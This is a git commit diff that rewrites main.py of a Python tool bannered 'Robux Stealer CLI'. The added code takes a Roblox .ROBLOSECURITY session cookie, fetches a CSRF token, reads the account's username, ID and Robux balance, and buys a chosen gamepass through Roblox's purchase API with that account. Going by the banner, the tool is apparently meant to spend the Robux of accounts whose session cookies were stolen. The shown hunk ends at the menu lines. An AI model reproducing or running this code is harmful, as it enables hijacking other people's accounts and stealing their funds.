2d5e4394a235ca74433352d9baaa587c80056ccf
0x77ff <116833814+0x77ff@users.noreply.github.com>
2023-11-07 18:34:22 +0000

    Update main.py

--- main.py
+++ main.py
@@ -1,6 +1,112 @@
-from BuyGamepass import buy_gamepass
-from GetAccountInfo import get_roblox_data
+
+import requests
 import os
+from bs4 import BeautifulSoup
+
+def buy_gamepass(url,cookie):
+
+    response = requests.get(url)
+
+    # Get required gamepass data
+    if response.status_code == 200:
+        html_content = response.text
+
+        soup = BeautifulSoup(html_content, 'html.parser')
+
+        item_container = soup.find('div', id='item-container')
+
+        ProductID = soup.find('div', id='item-container')['data-product-id']
+        data_expected_currency = item_container['data-expected-currency']
+        data_expected_price = item_container['data-expected-price']
+        expected_seller_id = item_container['data-expected-seller-id']
+
+        print('Product ID:', ProductID)
+        print('data-expected-currency:', data_expected_currency)
+        print('data-expected-price:', data_expected_price)
+        print('data-expected-seller-id:', expected_seller_id)
+    else:
+        print(f'Failed to retrieve the HTML content. Status code: {response.status_code}')
+
+    ######################################################################################
+
+    # Create a session and set the .ROBLOSECURITY cookie
+    session = requests.Session()
+    session.cookies['.ROBLOSECURITY'] = cookie
+
+    # Send the first request to get the X-CSRF token for Authentication
+    req = session.post(
+        url='https://auth.roblox.com/'
+    )
+
+    if 'X-CSRF-Token' in req.headers:
+        # Store the X-CSRF token in the session headers
+        session.headers['X-CSRF-Token'] = req.headers['X-CSRF-Token']
+
+    # Define API Endpoint to buy gamepasses
+    url2 = f'https://economy.roblox.com/v1/purchases/products/{ProductID}'
+
+    # Send the data of the gamepass
+    data = {
+        'expectedCurrency': int(data_expected_currency),
+        'expectedPrice': int(data_expected_price),
+        'expectedSellerId': int(expected_seller_id)
+    }
+
+    # Set up the headers for Authentication
+    headers = {
+        'X-CSRF-TOKEN': session.headers.get('X-CSRF-Token'),  # Use the X-CSRF token from the session
+        'Content-Type': 'application/json; charset=utf-8',
+    }
+
+    response = session.post(url2, json=data, headers=headers)
+
+    # Check the response status and content
+    if response.status_code == 200:
+        print('POST request was successful!')
+        print('Response content:', response.text)
+    else:
+        print(f'Response text:', response.text)
+        print(f'POST request failed with status code {response.status_code}')
+
+def get_roblox_data(cookie):
+    session = requests.Session()
+    session.cookies['.ROBLOSECURITY'] = cookie
+
+    req = session.post(
+        url='https://auth.roblox.com/'
+    )
+
+    if 'X-CSRF-Token' in req.headers:
+        session.headers['X-CSRF-Token'] = req.headers['X-CSRF-Token']
+
+    url2 = 'https://users.roblox.com/v1/users/authenticated'
+
+    headers = {
+        'X-CSRF-TOKEN': session.headers.get('X-CSRF-Token'),
+        'Content-Type': 'application/json; charset=utf-8',
+    }
+
+    response = session.get(url2, headers=headers)
+
+    user_id = ''
+    if response.status_code == 200:
+        response_json = response.json()
+        for name, key in response_json.items():
+            print(name, ':', key)  # Print the username, Displayname, and ID
+        user_id = response_json.get('id')
+    else:
+        print(f'Response text:', response.text)
+        print(f'GET request failed with status code {response.status_code}')
+
+    url3 = f'https://economy.roblox.com/v1/users/{user_id}/currency'
+    response = session.get(url3, headers=headers)
+    if response.status_code == 200:
+        response_json = response.json()
+        robux = response_json.get('robux')
+        print('Robux :', robux)
+    else:
+        print(f'Response text:', response.text)
+        print(f'GET request failed with status code {response.status_code}')
 
 print('\033[31mRobux Stealer CLI   \033[0m')
 print('\033[34m [+]Buy Gamepass (1) \033[0m')
